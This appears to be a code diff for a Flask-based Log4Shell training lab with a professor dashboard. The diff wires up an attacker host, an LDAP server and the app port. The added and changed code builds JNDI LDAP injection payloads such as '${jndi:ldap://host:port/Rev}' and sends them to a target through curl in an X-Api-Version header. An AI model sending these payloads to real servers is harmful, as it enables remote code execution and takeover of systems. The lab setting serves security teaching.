@@ -27,6 +27,9 @@ VULNERABLE_HOST = os.environ.get('VULNERABLE_HOST', 'vulnerable')
 VULNERABLE_PORT = os.environ.get('VULNERABLE_PORT', '8080')
 LDAP_HOST       = os.environ.get('LDAP_HOST',       'ldap')
 LDAP_PORT_ENV   = os.environ.get('LDAP_PORT',       '1389')
+ATTACKER_HOST   = os.environ.get('ATTACKER_HOST',   'attacker-webserver')
+ATTACKER_HTTP_PORT = os.environ.get('ATTACKER_HTTP_PORT', '8888')
+APP_PORT        = int(os.environ.get('APP_PORT',    '5000'))
 
 # Repertoire de base detecte automatiquement
 BASE_DIR     = os.path.dirname(os.path.abspath(__file__))
@@ -261,6 +264,17 @@ def log_user_action(action, details=''):
             })
 
 
+def build_runtime_config():
+    return {
+        'ldap_host': LDAP_HOST,
+        'ldap_port': LDAP_PORT_ENV,
+        'target': f'{VULNERABLE_HOST}:{VULNERABLE_PORT}',
+        'payload': f'${{jndi:ldap://{LDAP_HOST}:{LDAP_PORT_ENV}/Rev}}',
+        'attacker_http_port': ATTACKER_HTTP_PORT,
+        'app_port': APP_PORT,
+    }
+
+
 # ══════════════════════════════════════════════
 #  Routes — Authentification
 # ══════════════════════════════════════════════
@@ -308,7 +322,7 @@ def index():
 def dashboard():
     if current_user.role == 'professor':
         return redirect(url_for('professor_dashboard'))
-    return render_template('dashboard.html', user=current_user)
+    return render_template('dashboard.html', user=current_user, runtime=build_runtime_config())
 
 @app.route('/learn')
 @login_required
@@ -597,8 +611,8 @@ def export_analytics():
 def generate_payload():
     data         = request.json
     payload_type = data.get('type', 'simple')
-    ldap_host    = data.get('ip',        LDAP_HOST)
-    ldap_port    = data.get('ldap_port', LDAP_PORT_ENV)
+    ldap_host    = data.get('host', data.get('ip', LDAP_HOST))
+    ldap_port    = data.get('ldap_port', data.get('port', LDAP_PORT_ENV))
 
     payloads = {
         'simple':        f'${{jndi:ldap://{ldap_host}:{ldap_port}/Exploit}}',
@@ -616,9 +630,12 @@ def launch_attack():
     target  = data.get('target',  f'{VULNERABLE_HOST}:{VULNERABLE_PORT}')
     payload = data.get('payload', f'${{jndi:ldap://{LDAP_HOST}:{LDAP_PORT_ENV}/Rev}}')
 
+    if not target.startswith('http://') and not target.startswith('https://'):
+        target = f'http://{target}'
+
     try:
         subprocess.run(
-            ['curl', f'http://{target}', '-H', f'X-Api-Version: {payload}'],
+            ['curl', target, '-H', f'X-Api-Version: {payload}'],
             capture_output=True, text=True, timeout=5
         )
 
@@ -682,19 +699,11 @@ def compile_payload():
 @app.route('/api/start-webserver', methods=['POST'])
 @login_required
 def start_webserver():
-    try:
-        result = subprocess.run(['lsof', '-ti:8888'], capture_output=True, text=True)
-        if result.stdout.strip():
-            return jsonify({'status': 'success', 'message': 'Serveur web deja actif'})
-
-        os.chdir(ATTACKER_DIR)
-        subprocess.Popen(['python3', '-m', 'http.server', '8888'],
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(1)
-        log_user_action('start_webserver')
-        return jsonify({'status': 'success', 'message': 'Serveur web demarre'})
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)})
+    log_user_action('start_webserver')
+    return jsonify({
+        'status': 'success',
+        'message': f'Serveur HTTP deja disponible via {ATTACKER_HOST}:{ATTACKER_HTTP_PORT}'
+    })
 
 
 @app.route('/api/attack-log')
@@ -708,4 +717,4 @@ def get_attack_log():
 # ══════════════════════════════════════════════
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=APP_PORT, debug=False)
